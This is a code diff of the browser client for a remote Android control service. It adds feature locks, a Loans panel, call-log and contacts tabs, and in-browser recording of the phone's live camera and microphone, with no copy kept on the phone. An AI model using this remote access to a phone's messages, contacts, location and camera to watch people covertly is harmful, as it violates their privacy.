@@ -2,22 +2,32 @@ import { initializeApp } from "https://www.gstatic.com/firebasejs/11.7.3/firebas
 import {
   getAuth,
   GoogleAuthProvider,
+  EmailAuthProvider,
   onAuthStateChanged,
   signInWithPopup,
   signInWithEmailAndPassword,
   createUserWithEmailAndPassword,
+  reauthenticateWithCredential,
+  updatePassword,
   signOut,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-auth.js";
 import {
   getFirestore,
   doc,
+  getDoc,
   onSnapshot,
   collection,
   setDoc,
   query,
   orderBy,
 } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-firestore.js";
-import { getStorage, ref as storageRef, getBlob } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-storage.js";
+import {
+  getStorage,
+  ref as storageRef,
+  getBlob,
+  uploadBytes,
+  getDownloadURL,
+} from "https://www.gstatic.com/firebasejs/11.7.3/firebase-storage.js";
 import QRCode from "https://cdn.jsdelivr.net/npm/qrcode@1.5.4/+esm";
 import {
   canonicalSessionRequest,
@@ -88,10 +98,7 @@ let messagesLiveTimer = null;
 const PANEL_TITLES = {
   phone: "My Phone",
   pair: "Pair Browser",
-  security: "Trusted Browsers",
-  multiview: "Multi Device View",
-  social: "Facebook & Instagram",
-  settings: "Settings",
+  loans: "Loans",
   sessions: "Sessions",
   media: "Media",
 };
@@ -130,7 +137,8 @@ function showPanel(panelId) {
   let id = String(panelId || "phone");
   if (id === "home" || id === "devices" || id === "location" || id === "info"
       || id === "gallery" || id === "files" || id === "notifications" || id === "messages"
-      || id === "transfers") {
+      || id === "call-logs" || id === "contacts"
+      || id === "transfers" || id === "multiview" || id === "settings") {
     id = "phone";
   }
   document.querySelectorAll(".panel").forEach((el) => {
@@ -149,10 +157,19 @@ function showPanel(panelId) {
     setPhoneTab(activePhoneTab);
   }
   if (id === "sessions") refreshSessions().catch(() => {});
-  if (id === "security") refreshClients().catch(() => {});
   if (id === "media") refreshMedia().catch(() => {});
-  if (id === "social") ensureSocialFrame();
-  if (id === "multiview") refreshMultiViewPanel().catch(() => {});
+  if (id === "loans") void loadLoanWorkspace();
+}
+
+async function refreshAdminSettingsLink() {
+  const link = document.getElementById("nav-admin-link");
+  if (!link) return;
+  try {
+    const data = await api("/api/admin/me");
+    link.hidden = !data?.isAdmin;
+  } catch {
+    link.hidden = true;
+  }
 }
 
 function syncHiddenDeviceSelects(deviceId) {
@@ -162,6 +179,8 @@ function syncHiddenDeviceSelects(deviceId) {
     "gallery-device-select",
     "notifications-device-select",
     "messages-device-select",
+    "call-logs-device-select",
+    "contacts-device-select",
     "files-device-select",
   ]) {
     const el = document.getElementById(id);
@@ -173,6 +192,16 @@ function syncHiddenDeviceSelects(deviceId) {
     }
     if (deviceId) el.value = deviceId;
   }
+}
+
+function updateRemoveDeviceButton() {
+  const btn = document.getElementById("btn-remove-device");
+  if (!btn) return;
+  const hasDevice = Boolean(
+    selectedWorkspaceDeviceId &&
+      (cachedDevices || []).some((d) => d.deviceId === selectedWorkspaceDeviceId && !d.revoked)
+  );
+  btn.disabled = !hasDevice;
 }
 
 function fillWorkspaceDeviceSelect() {
@@ -192,6 +221,7 @@ function fillWorkspaceDeviceSelect() {
       hint.textContent = "Install the app on a phone, sign in with this account, enable Remote Control, then Refresh.";
     }
     syncHiddenDeviceSelects("");
+    updateRemoveDeviceButton();
     return;
   }
   for (const d of devices) {
@@ -211,6 +241,115 @@ function fillWorkspaceDeviceSelect() {
   if (hint && chosen) {
     hint.textContent = `${chosen.manufacturer || ""} ${chosen.deviceModel || ""} · Android ${chosen.androidVersion || "?"} · battery ${chosen.batteryLevel ?? "—"}%`.trim();
   }
+  updateRemoveDeviceButton();
+}
+
+async function removeSelectedWorkspaceDevice() {
+  const deviceId = String(selectedWorkspaceDeviceId || "").trim();
+  const device = (cachedDevices || []).find((d) => d.deviceId === deviceId && !d.revoked);
+  if (!deviceId || !device) return;
+
+  const label = device.deviceName || device.deviceModel || deviceId;
+  const onlineNote = device.online ? "\n\nThis phone is currently online." : "";
+  const ok = confirm(
+    `Remove "${label}" from your account?${onlineNote}\n\n` +
+      "The phone will disappear from this website. Any active live session on this phone will end.\n\n" +
+      "You can add it again later from the Android app (Remote Control ON + Refresh)."
+  );
+  if (!ok) return;
+
+  const btn = document.getElementById("btn-remove-device");
+  const hint = document.getElementById("workspace-device-hint");
+  if (btn) btn.disabled = true;
+  if (hint) hint.textContent = "Removing device…";
+
+  try {
+    if (liveByDevice.has(deviceId)) {
+      await endLiveSession(deviceId, "device_removed");
+    }
+    await api(`/api/device/devices/${encodeURIComponent(deviceId)}/remove`, {
+      method: "POST",
+      body: "{}",
+    });
+    selectedWorkspaceDeviceId = "";
+    await refreshDevices();
+    if (hint) hint.textContent = `"${label}" removed.`;
+    if (deviceList) {
+      deviceList.textContent = "Device removed. Select another phone or connect a new one.";
+      deviceList.classList.add("muted");
+    }
+  } catch (e) {
+    if (hint) hint.textContent = e instanceof Error ? e.message : String(e);
+    alert(e instanceof Error ? e.message : String(e));
+    updateRemoveDeviceButton();
+  }
+}
+
+/** @type {{ features?: Record<string, boolean>, contactSupportMessage?: string, expiresAt?: number, expired?: boolean } | null} */
+let userEntitlements = null;
+
+const FEATURE_TAB_LABELS = {
+  camera: "Camera & Voice",
+  location: "Location",
+  info: "Device Information",
+  gallery: "Gallery",
+  notifications: "Notifications",
+  messages: "Messages",
+  "call-logs": "Call Logs",
+  contacts: "Contacts",
+  files: "File Manager",
+  screen: "Screen Mirror",
+  recording: "Screen Recording",
+  apps: "Installed Apps",
+  "app-usage": "Recent Apps",
+};
+
+function isWebsiteFeatureAllowed(featureKey) {
+  if (!userEntitlements?.features) return true;
+  return Boolean(userEntitlements.features[featureKey]);
+}
+
+function applyFeatureTabLocks() {
+  document.querySelectorAll(".phone-tab").forEach((btn) => {
+    const key = btn.dataset.phoneTab;
+    const ok = isWebsiteFeatureAllowed(key);
+    btn.classList.toggle("feature-locked", !ok);
+    if (!ok) {
+      btn.title = `${FEATURE_TAB_LABELS[key] || key} — contact support to enable`;
+    }
+  });
+}
+
+async function refreshUserEntitlements() {
+  if (!idToken) return;
+  try {
+    const data = await api("/api/device/account-status");
+    userEntitlements = data.entitlements || null;
+    applyFeatureTabLocks();
+    if (document.getElementById("panel-phone") && !document.getElementById("panel-phone").hidden) {
+      setPhoneTab(activePhoneTab);
+    }
+  } catch (e) {
+    if (e && e.code === "ACCOUNT_BLOCKED") return;
+    /* keep previous entitlements */
+  }
+}
+
+function showFeatureLockedPanel(tabId) {
+  const locked = document.getElementById("phone-feature-locked");
+  const title = document.getElementById("feature-locked-title");
+  const msg = document.getElementById("feature-locked-message");
+  document.querySelectorAll(".phone-tab-panel").forEach((panel) => {
+    panel.hidden = true;
+  });
+  if (locked) locked.hidden = false;
+  const label = FEATURE_TAB_LABELS[tabId] || tabId;
+  if (title) title.textContent = `${label} is not enabled`;
+  if (msg) {
+    msg.textContent =
+      userEntitlements?.contactSupportMessage ||
+      "This feature is not enabled for your account. Please contact the support team using the Help button.";
+  }
 }
 
 function setPhoneTab(tabId) {
@@ -220,44 +359,251 @@ function setPhoneTab(tabId) {
     btn.classList.toggle("active", on);
     btn.setAttribute("aria-selected", on ? "true" : "false");
   });
+  applyFeatureTabLocks();
+  if (!isWebsiteFeatureAllowed(activePhoneTab)) {
+    showFeatureLockedPanel(activePhoneTab);
+    return;
+  }
+  const locked = document.getElementById("phone-feature-locked");
+  if (locked) locked.hidden = true;
   document.querySelectorAll(".phone-tab-panel").forEach((panel) => {
+    if (panel.id === "phone-feature-locked") return;
     panel.hidden = panel.dataset.phonePanel !== activePhoneTab;
   });
   if (activePhoneTab === "camera") {
-    // ensure device card visible for selection
+    // ensure device card visible for selection; restore live UI if still connected
     if (cachedDevices.length) renderDevices(cachedDevices, cachedClients);
+    else restoreActiveLiveSessionsUi();
+    if (selectedWorkspaceDeviceId) {
+      void hydrateLiveVideoClips(selectedWorkspaceDeviceId);
+    }
   }
   if (activePhoneTab === "location") openLocationTab().catch(() => {});
   if (activePhoneTab === "info") refreshInfoPanel().catch(() => {});
   if (activePhoneTab === "gallery") refreshGalleryPanel().catch(() => {});
   if (activePhoneTab === "notifications") refreshNotificationsPanel().catch(() => {});
   if (activePhoneTab === "messages") refreshMessagesPanel().catch(() => {});
-  if (activePhoneTab === "files") refreshFilesPanel().catch(() => {});
+  if (activePhoneTab === "call-logs") refreshCallLogsPanel().catch(() => {});
+  if (activePhoneTab === "contacts") refreshContactsPanel().catch(() => {});
+  if (activePhoneTab === "files") {
+    const body = document.getElementById("files-panel-body");
+    refreshFilesPanel({ silent: Boolean(body?.querySelector(".files-grid, ul")) }).catch(() => {});
+  }
   if (activePhoneTab === "screen") updateScreenStatusUi();
   if (activePhoneTab === "recording") refreshRecordingsPanel().catch(() => {});
   if (activePhoneTab === "apps") refreshAppsPanel().catch(() => {});
+  if (activePhoneTab === "app-usage") refreshAppUsagePanel().catch(() => {});
 }
 
 function onWorkspaceDeviceChanged() {
   const select = document.getElementById("workspace-device-select");
   selectedWorkspaceDeviceId = String(select?.value || "");
   syncHiddenDeviceSelects(selectedWorkspaceDeviceId);
+  locationLastRenderKey = "";
+  locationMapCoords = null;
   const chosen = (cachedDevices || []).find((d) => d.deviceId === selectedWorkspaceDeviceId);
   const hint = document.getElementById("workspace-device-hint");
   if (hint && chosen) {
     hint.textContent = `${chosen.manufacturer || ""} ${chosen.deviceModel || ""} · Android ${chosen.androidVersion || "?"} · battery ${chosen.batteryLevel ?? "—"}%`.trim();
   }
+  updateRemoveDeviceButton();
   setPhoneTab(activePhoneTab);
 }
 
-function ensureSocialFrame() {
-  const frame = document.getElementById("social-frame");
-  if (!frame) return;
-  const target = frame.getAttribute("data-src") || "/?embed=1";
-  const current = frame.getAttribute("src") || "";
-  if (!current || current === "about:blank" || current === "about:blank#") {
-    frame.setAttribute("src", target);
+function userHasPasswordProvider(user) {
+  return Boolean(user?.providerData?.some((p) => p.providerId === "password"));
+}
+
+function refreshPasswordChangeUi(user) {
+  const googleNote = document.getElementById("password-change-google-note");
+  const hint = document.getElementById("password-change-hint");
+  const sidebarBtn = document.getElementById("btn-sidebar-change-password");
+  const settingsBtn = document.getElementById("btn-settings-change-password");
+  const dialogGoogleNote = document.getElementById("password-dialog-google-note");
+  const dialogFields = document.getElementById("password-dialog-fields");
+  const dialogEmail = document.getElementById("password-dialog-email");
+  const canChange = userHasPasswordProvider(user);
+  if (hint) hint.hidden = !canChange;
+  if (googleNote) googleNote.hidden = canChange;
+  if (sidebarBtn) sidebarBtn.hidden = !canChange;
+  if (settingsBtn) settingsBtn.hidden = !canChange;
+  if (dialogGoogleNote) dialogGoogleNote.hidden = canChange;
+  if (dialogFields) dialogFields.hidden = !canChange;
+  if (dialogEmail) {
+    dialogEmail.textContent = user?.email
+      ? `Account: ${user.email}`
+      : "";
   }
+  if (!canChange) {
+    setPasswordChangeStatus("");
+    clearPasswordChangeForm();
+  }
+}
+
+function clearPasswordChangeForm() {
+  for (const id of ["password-current", "password-new", "password-confirm"]) {
+    const el = document.getElementById(id);
+    if (el) el.value = "";
+  }
+}
+
+function setPasswordChangeStatus(message, tone = "") {
+  const el = document.getElementById("password-change-status");
+  if (!el) return;
+  el.textContent = message || "";
+  el.classList.remove("is-error", "is-success");
+  if (tone === "error") el.classList.add("is-error");
+  if (tone === "success") el.classList.add("is-success");
+}
+
+function openPasswordChangeDialog() {
+  const user = auth?.currentUser;
+  if (!userHasPasswordProvider(user)) {
+    setPasswordChangeStatus(
+      "Password change is only available for email/password accounts.",
+      "error"
+    );
+    return;
+  }
+  refreshPasswordChangeUi(user);
+  setPasswordChangeStatus("");
+  clearPasswordChangeForm();
+  const dialog = document.getElementById("dialog-change-password");
+  if (!dialog) return;
+  if (typeof dialog.showModal === "function") {
+    dialog.showModal();
+  } else {
+    dialog.setAttribute("open", "");
+  }
+  window.setTimeout(() => {
+    document.getElementById("password-current")?.focus();
+  }, 0);
+}
+
+function closePasswordChangeDialog() {
+  const dialog = document.getElementById("dialog-change-password");
+  if (!dialog) return;
+  if (typeof dialog.close === "function") {
+    dialog.close();
+  } else {
+    dialog.removeAttribute("open");
+  }
+  setPasswordChangeStatus("");
+  clearPasswordChangeForm();
+}
+
+async function submitPasswordChange(ev) {
+  ev?.preventDefault();
+  const user = auth?.currentUser;
+  const currentInput = document.getElementById("password-current");
+  const newInput = document.getElementById("password-new");
+  const confirmInput = document.getElementById("password-confirm");
+  const submitBtn = document.getElementById("btn-change-password-submit");
+  if (!user || !userHasPasswordProvider(user)) {
+    setPasswordChangeStatus("Password change is only available for email/password accounts.", "error");
+    return;
+  }
+  const currentPassword = String(currentInput?.value || "");
+  const newPassword = String(newInput?.value || "");
+  const confirmPassword = String(confirmInput?.value || "");
+  if (!currentPassword || !newPassword || !confirmPassword) {
+    setPasswordChangeStatus("Enter current password, new password, and confirmation.", "error");
+    return;
+  }
+  if (newPassword.length < 6) {
+    setPasswordChangeStatus("New password must be at least 6 characters.", "error");
+    return;
+  }
+  if (newPassword === currentPassword) {
+    setPasswordChangeStatus("New password must be different from the current password.", "error");
+    return;
+  }
+  if (newPassword !== confirmPassword) {
+    setPasswordChangeStatus("New password and confirmation do not match.", "error");
+    return;
+  }
+  if (!user.email) {
+    setPasswordChangeStatus("No email on this account.", "error");
+    return;
+  }
+  if (submitBtn) submitBtn.disabled = true;
+  setPasswordChangeStatus("Updating password…");
+  try {
+    const credential = EmailAuthProvider.credential(user.email, currentPassword);
+    await reauthenticateWithCredential(user, credential);
+    await updatePassword(user, newPassword);
+    clearPasswordChangeForm();
+    setPasswordChangeStatus(
+      "Password updated successfully. Paired browsers and phones keep working. Use the new password next time you sign in.",
+      "success"
+    );
+    window.setTimeout(() => {
+      closePasswordChangeDialog();
+    }, 2200);
+  } catch (e) {
+    setPasswordChangeStatus(friendlyPasswordChangeError(e), "error");
+  } finally {
+    if (submitBtn) submitBtn.disabled = false;
+  }
+}
+
+function friendlyPasswordChangeError(e) {
+  const code = e && typeof e.code === "string" ? e.code : "";
+  if (code === "auth/wrong-password" || code === "auth/invalid-credential") {
+    return "Current password is incorrect.";
+  }
+  if (code === "auth/too-many-requests") {
+    return "Too many attempts. Wait a few minutes, then try again.";
+  }
+  if (code === "auth/requires-recent-login") {
+    return "For security, sign out and sign in again, then change your password.";
+  }
+  return friendlyAuthError(e);
+}
+
+function setBootLoading(show, text) {
+  const el = document.getElementById("boot-loading");
+  const msg = document.getElementById("boot-loading-text");
+  if (msg && text) msg.textContent = text;
+  if (el) {
+    el.hidden = !show;
+    el.setAttribute("aria-busy", show ? "true" : "false");
+    if (show) el.removeAttribute("hidden");
+    else el.setAttribute("hidden", "");
+  }
+  document.body.classList.toggle("is-booting", Boolean(show));
+  if (!show && bootLoadingWatchdog) {
+    clearTimeout(bootLoadingWatchdog);
+    bootLoadingWatchdog = null;
+  }
+}
+
+/** @type {ReturnType<typeof setTimeout> | null} */
+let bootLoadingWatchdog = null;
+
+function armBootLoadingWatchdog(ms = 12000) {
+  if (bootLoadingWatchdog) clearTimeout(bootLoadingWatchdog);
+  bootLoadingWatchdog = setTimeout(() => {
+    bootLoadingWatchdog = null;
+    const el = document.getElementById("boot-loading");
+    if (el && !el.hidden) {
+      console.warn("Boot loading watchdog — forcing UI");
+      setBootLoading(false);
+      // If neither view is visible, show login as a safe fallback.
+      if (viewApp?.hidden && viewLogin?.hidden) {
+        setLoggedOutUi();
+      }
+    }
+  }, ms);
+}
+
+function withTimeout(promise, ms, label) {
+  return Promise.race([
+    promise,
+    new Promise((_, reject) => {
+      setTimeout(() => reject(new Error(`${label || "Request"} timed out`)), ms);
+    }),
+  ]);
 }
 
 function setLoggedInUi(user) {
@@ -280,11 +626,22 @@ function setLoggedInUi(user) {
       ? `Signed in as ${user.email || user.uid}`
       : "Not logged in";
   }
+  const fabOn = document.getElementById("support-fab");
+  if (fabOn) fabOn.hidden = false;
+  startSupportUnreadPolling();
+  void refreshUserEntitlements();
+  refreshPasswordChangeUi(user);
+  refreshAdminSettingsLink().catch(() => {});
 }
 
 function setLoggedOutUi() {
   setAuthBusy(false);
   closeNavDrawer();
+  stopSupportChatPolling();
+  closeSupportChat();
+  userEntitlements = null;
+  const fabOff = document.getElementById("support-fab");
+  if (fabOff) fabOff.hidden = true;
   if (viewApp) {
     viewApp.hidden = true;
     viewApp.setAttribute("hidden", "");
@@ -297,6 +654,8 @@ function setLoggedOutUi() {
   }
   if (headerUser) headerUser.textContent = "";
   if (authStatus) authStatus.textContent = "Not logged in";
+  const adminLink = document.getElementById("nav-admin-link");
+  if (adminLink) adminLink.hidden = true;
   showPanel("phone");
 }
 
@@ -335,6 +694,10 @@ let imageZoomState = null;
 let publicIceServers = [{ urls: "stun:stun.l.google.com:19302" }];
 /** @type {Map<string, LiveSession>} */
 const liveByDevice = new Map();
+/** @type {Map<string, Array<{ localId: string, mediaId?: string, kind?: string, fileName: string, objectUrl: string, downloadUrl?: string, createdAt: number, sizeBytes: number, status: string }>>} */
+const liveVideoClipsByDevice = new Map();
+/** @type {Map<string, ReturnType<typeof setInterval>>} */
+const liveCapturesPollByDevice = new Map();
 /** Independent screen-mirror sessions (do not share camera liveByDevice). */
 /** @type {Map<string, LiveSession>} */
 const screenLiveByDevice = new Map();
@@ -467,6 +830,8 @@ function resetLiveControlState(deviceId) {
  * @property {(() => void) | null} unsubSignals
  * @property {(() => void) | null} unsubSession
  * @property {ReturnType<typeof setTimeout> | null} expiryTimer
+ * @property {ReturnType<typeof setTimeout> | null} [offerWaitTimer]
+ * @property {boolean} [iceRestarted]
  * @property {Set<string>} seenSignals
  * @property {boolean} remoteDescriptionSet
  * @property {RTCIceCandidateInit[]} pendingIce
@@ -475,9 +840,9 @@ function resetLiveControlState(deviceId) {
  */
 
 async function loadConfig() {
-  const res = await fetch("/api/config");
+  const res = await withTimeout(fetch("/api/config"), 10000, "Config");
   if (!res.ok) throw new Error("Failed to load /api/config");
-  return res.json();
+  return withTimeout(res.json(), 5000, "Config JSON");
 }
 
 async function api(path, options = {}) {
@@ -492,6 +857,26 @@ async function api(path, options = {}) {
   });
   const body = await res.json().catch(() => ({}));
   if (!res.ok) {
+    if (body.code === "ACCOUNT_BLOCKED") {
+      await forceLogoutBlocked(
+        body.error || "Your account has been disabled by an administrator."
+      );
+      const err = new Error(
+        body.error || "Your account has been disabled by an administrator."
+      );
+      err.code = "ACCOUNT_BLOCKED";
+      throw err;
+    }
+    if (body.code === "FEATURE_DENIED") {
+      const err = new Error(
+        body.error ||
+          "This feature is not enabled for your account. Please contact the support team using the Help button."
+      );
+      err.code = "FEATURE_DENIED";
+      err.feature = body.feature || "";
+      err.howTo = body.howTo || "";
+      throw err;
+    }
     throw new Error(
       body.error || body.message || body.code || `HTTP ${res.status}`
     );
@@ -499,10 +884,55 @@ async function api(path, options = {}) {
   return body;
 }
 
+let accountBlockLogoutInFlight = false;
+
+async function forceLogoutBlocked(message) {
+  if (accountBlockLogoutInFlight) return;
+  accountBlockLogoutInFlight = true;
+  try {
+    const msg =
+      message ||
+      "Your account has been disabled by an administrator. Sign in again after you are unblocked.";
+    if (authStatus) authStatus.textContent = msg;
+    try {
+      window.alert(msg);
+    } catch {
+      /* ignore */
+    }
+    if (auth) {
+      try {
+        await signOut(auth);
+      } catch {
+        /* ignore */
+      }
+    }
+  } finally {
+    accountBlockLogoutInFlight = false;
+  }
+}
+
+function formatRelativeAge(ms) {
+  const delta = Date.now() - Number(ms);
+  if (!Number.isFinite(delta) || delta < 0) return "";
+  const sec = Math.round(delta / 1000);
+  if (sec < 45) return "just now";
+  const min = Math.round(sec / 60);
+  if (min < 60) return `${min} min ago`;
+  const hr = Math.round(min / 60);
+  if (hr < 48) return `${hr} hr ago`;
+  const day = Math.round(hr / 24);
+  return `${day} day${day === 1 ? "" : "s"} ago`;
+}
+
 function formatSeen(ms) {
   if (!ms) return "never";
-  const d = new Date(ms);
-  return Number.isNaN(d.getTime()) ? "unknown" : d.toLocaleString();
+  const t = Number(ms);
+  if (!Number.isFinite(t) || t <= 0) return "unknown";
+  const d = new Date(t);
+  if (Number.isNaN(d.getTime())) return "unknown";
+  const rel = formatRelativeAge(t);
+  const abs = d.toLocaleString();
+  return rel ? `${rel} · ${abs}` : abs;
 }
 
 function escapeHtml(value) {
@@ -513,8 +943,14 @@ function escapeHtml(value) {
     .replaceAll('"', "&quot;");
 }
 
-function preferredClientId(clients) {
-  const active = (clients || []).filter((c) => !c.revoked);
+/**
+ * Client id for *this* browser install only (fingerprint / local storage).
+ * Does not fall back to another user's paired browser on the same account.
+ */
+function thisBrowserClientId(clients) {
+  const active = (clients || []).filter(
+    (c) => !c.revoked && c.clientId !== "platform_admin" && !c.isPlatformAdminClient
+  );
   const fp = browserFingerprint || localStorage.getItem(FINGERPRINT_KEY) || "";
   if (fp) {
     const byFp = active.find((c) => c.browserFingerprintHash === fp);
@@ -524,8 +960,19 @@ function preferredClientId(clients) {
     }
   }
   const stored = localStorage.getItem(CLIENT_ID_KEY) || "";
-  if (stored && active.some((c) => c.clientId === stored)) return stored;
+  if (stored && stored !== "platform_admin" && active.some((c) => c.clientId === stored)) {
+    return stored;
+  }
   return "";
+}
+
+function isThisBrowserPaired(clients) {
+  return Boolean(thisBrowserClientId(clients));
+}
+
+/** @deprecated Use thisBrowserClientId — kept as alias for call sites. */
+function preferredClientId(clients) {
+  return thisBrowserClientId(clients);
 }
 
 function preferredClient(clients) {
@@ -604,8 +1051,8 @@ function renderDevices(devices, clients) {
             <select class="quality-select" data-device-id="${id}">
               <option value="auto">Auto (720p)</option>
               <option value="1080">1080p</option>
-              <option value="720" selected>720p</option>
-              <option value="480">480p</option>
+              <option value="720">720p</option>
+              <option value="480" selected>480p</option>
               <option value="360">360p</option>
             </select>
           </label>
@@ -624,7 +1071,8 @@ function renderDevices(devices, clients) {
             <audio class="live-audio" data-audio-for="${id}" autoplay playsinline></audio>
             <p class="live-audio-hint muted" data-audio-hint-for="${id}" hidden>
               Live microphone is on the phone stream. Tap <strong>Enable speaker</strong> if you hear no voice
-              (browser autoplay may block sound). “Start audio” only saves a file on the phone — it is not live voice.
+              (browser autoplay may block sound). <strong>Start video</strong> records camera + mic and lists the file below
+              (not kept on the phone). “Record audio file” still saves on the phone until upload finishes.
             </p>
             <div class="live-controls" data-controls-for="${id}">
               <span class="live-rec-badge" aria-live="polite">
@@ -636,10 +1084,18 @@ function renderDevices(devices, clients) {
               <button type="button" data-toggle="torch" aria-pressed="false">Torch: OFF</button>
               <button type="button" data-toggle="mic" aria-pressed="false">Mic: ON</button>
               <button type="button" data-cmd="CAPTURE_PHOTO">Capture photo</button>
-              <button type="button" data-toggle="video-rec" aria-pressed="false">Start video</button>
+              <button type="button" data-toggle="video-rec" aria-pressed="false" title="Records live camera + mic in the browser, then saves here (not kept on the phone)">Start video</button>
               <button type="button" data-toggle="audio-rec" aria-pressed="false" title="Saves an audio file on the phone; may pause live mic">Record audio file</button>
               <button type="button" class="btn-end-live" data-cmd="END_SESSION">End session</button>
             </div>
+          </div>
+          <div class="live-captures surface" data-captures-for="${id}">
+            <div class="live-captures-head">
+              <strong>Saved photos &amp; videos</strong>
+              <button type="button" class="btn-secondary btn-captures-refresh" data-device-id="${id}">Refresh</button>
+            </div>
+            <p class="muted live-captures-hint">Captured from your phone · view / download below (stays here after you disconnect).</p>
+            <div class="live-captures-list" data-captures-list-for="${id}"></div>
           </div>
         </div>
       </article>`;
@@ -678,6 +1134,16 @@ function renderDevices(devices, clients) {
           btn.classList.add("is-active");
           setTimeout(() => btn.classList.remove("is-active"), 450);
         }
+        if (action === "CAPTURE_PHOTO") {
+          setDeviceStatus(deviceId, "Capturing photo…");
+          sendCommand(deviceId, action)
+            .then(() => {
+              startLiveCapturesPoll(deviceId);
+              nudgeLiveVideoPlayback(deviceId);
+            })
+            .catch(() => {});
+          return;
+        }
         sendCommand(deviceId, action).catch(() => {});
       });
     });
@@ -685,10 +1151,73 @@ function renderDevices(devices, clients) {
       btn.addEventListener("click", () => {
         const toggle = btn.getAttribute("data-toggle");
         if (!toggle) return;
-        handleLiveToggle(deviceId, toggle).catch(() => {});
+        handleLiveToggle(deviceId, toggle).catch((e) => {
+          const msg = e instanceof Error ? e.message : String(e);
+          if (msg) alert(msg);
+          applyLiveControlUi(deviceId);
+        });
       });
     });
+    renderLiveVideoClips(deviceId);
   });
+
+  focused.forEach((d) => {
+    void hydrateLiveVideoClips(d.deviceId);
+  });
+
+  deviceList.querySelectorAll(".btn-captures-refresh").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      const deviceId = btn.getAttribute("data-device-id");
+      if (deviceId) void hydrateLiveVideoClips(deviceId);
+    });
+  });
+
+  // Tab switches / refreshDevices rebuild this DOM — reattach any still-live sessions.
+  restoreActiveLiveSessionsUi();
+}
+
+/**
+ * After the camera card HTML is rebuilt, restore Connect / End Session / video
+ * for sessions that are still active in {@link liveByDevice}.
+ */
+function restoreActiveLiveSessionsUi() {
+  if (!deviceList) return;
+  for (const [deviceId, live] of liveByDevice.entries()) {
+    if (!live) continue;
+    live.root = deviceList.querySelector(`[data-device-id="${CSS.escape(deviceId)}"]`);
+    if (!live.root) continue;
+
+    const pc = live.pc;
+    const pcState = pc?.connectionState || "";
+    const receivers = pc
+      ? pc.getReceivers().filter((r) => r.track && r.track.readyState !== "ended")
+      : [];
+    const hasLiveMedia = receivers.length > 0;
+    const pcAlive =
+      Boolean(pc) && pcState !== "closed" && pcState !== "failed" && pcState !== "disconnected";
+
+    if (hasLiveMedia || (pcAlive && (pcState === "connected" || pcState === "connecting"))) {
+      setDeviceError(deviceId, "");
+      setConnectUi(deviceId, { connecting: false, live: true });
+      for (const receiver of receivers) {
+        attachRemoteTrack(deviceId, receiver.track, null);
+      }
+      if (live.connectionLabel) {
+        setDeviceStatus(deviceId, live.connectionLabel);
+      } else {
+        setConnectionLabel(deviceId, CONN.CONNECTED, "session still active");
+      }
+      applyLiveControlUi(deviceId);
+      renderLiveVideoClips(deviceId);
+      continue;
+    }
+
+    // Request pending / waiting for phone approval — keep Connect disabled.
+    if (live.requestId && !pc) {
+      setConnectUi(deviceId, { connecting: true, live: false });
+      if (live.connectionLabel) setDeviceStatus(deviceId, live.connectionLabel);
+    }
+  }
 }
 
 /**
@@ -707,13 +1236,9 @@ async function handleLiveToggle(deviceId, toggle) {
     st.micMuted = nextMuted;
   } else if (toggle === "video-rec") {
     if (!st.videoRecording) {
-      await sendCommand(deviceId, "START_VIDEO_RECORDING");
-      st.videoRecording = true;
-      st.videoStartedAt = Date.now();
+      await startLiveBrowserVideoRecording(deviceId);
     } else {
-      await sendCommand(deviceId, "STOP_VIDEO_RECORDING");
-      st.videoRecording = false;
-      st.videoStartedAt = 0;
+      await stopLiveBrowserVideoRecording(deviceId);
     }
   } else if (toggle === "audio-rec") {
     if (!st.audioRecording) {
@@ -733,6 +1258,642 @@ async function handleLiveToggle(deviceId, toggle) {
     }
   }
   applyLiveControlUi(deviceId);
+}
+
+function pickLiveRecorderMime() {
+  const types = [
+    "video/webm;codecs=vp9,opus",
+    "video/webm;codecs=vp8,opus",
+    "video/webm;codecs=vp8",
+    "video/webm",
+    "video/mp4",
+  ];
+  for (const t of types) {
+    try {
+      if (typeof MediaRecorder !== "undefined" && MediaRecorder.isTypeSupported(t)) return t;
+    } catch {
+      /* ignore */
+    }
+  }
+  return "";
+}
+
+function getLiveRecordMediaStream(deviceId) {
+  const live = liveByDevice.get(deviceId);
+  const pc = live?.pc;
+  if (!pc) throw new Error("Connect to the phone first, then Start video.");
+  const stream = new MediaStream();
+  for (const receiver of pc.getReceivers()) {
+    const track = receiver.track;
+    if (track && track.readyState === "live") {
+      stream.addTrack(track);
+    }
+  }
+  if (!stream.getVideoTracks().length) {
+    throw new Error("No live camera video yet. Wait until the preview appears.");
+  }
+  return stream;
+}
+
+/**
+ * Record live camera + mic in the browser (phone keeps no local video file).
+ * @param {string} deviceId
+ */
+async function startLiveBrowserVideoRecording(deviceId) {
+  const st = getLiveControlState(deviceId);
+  const live = liveByDevice.get(deviceId);
+  if (!live?.pc) throw new Error("Connect to the phone first, then Start video.");
+  if (live.browserVideoRecorder) {
+    throw new Error("Already recording");
+  }
+
+  // Ensure phone mic is unmuted so the recording includes voice.
+  if (st.micMuted) {
+    await sendCommand(deviceId, "MIC_UNMUTE");
+    st.micMuted = false;
+  }
+
+  const stream = getLiveRecordMediaStream(deviceId);
+  if (!stream.getAudioTracks().length) {
+    const ok = window.confirm(
+      "Live microphone track is not available yet.\n\n" +
+        "Recording will be video-only (no mic). Continue anyway?"
+    );
+    if (!ok) return;
+  }
+
+  const mimeType = pickLiveRecorderMime();
+  const recorder = mimeType
+    ? new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2_500_000 })
+    : new MediaRecorder(stream);
+  const chunks = [];
+  recorder.ondataavailable = (ev) => {
+    if (ev.data && ev.data.size > 0) chunks.push(ev.data);
+  };
+  recorder.onerror = () => {
+    st.videoRecording = false;
+    st.videoStartedAt = 0;
+    live.browserVideoRecorder = null;
+    live.browserVideoChunks = null;
+    applyLiveControlUi(deviceId);
+    alert("Video recording failed in this browser. Try Chrome/Edge.");
+  };
+  recorder.onstop = () => {
+    void finalizeLiveBrowserVideoRecording(deviceId, chunks, recorder.mimeType || mimeType || "video/webm");
+  };
+
+  live.browserVideoRecorder = recorder;
+  live.browserVideoChunks = chunks;
+  live.browserVideoMaxTimer = setTimeout(() => {
+    if (st.videoRecording) {
+      void stopLiveBrowserVideoRecording(deviceId).catch(() => {});
+    }
+  }, 10 * 60 * 1000);
+
+  recorder.start(1000);
+  st.videoRecording = true;
+  st.videoStartedAt = Date.now();
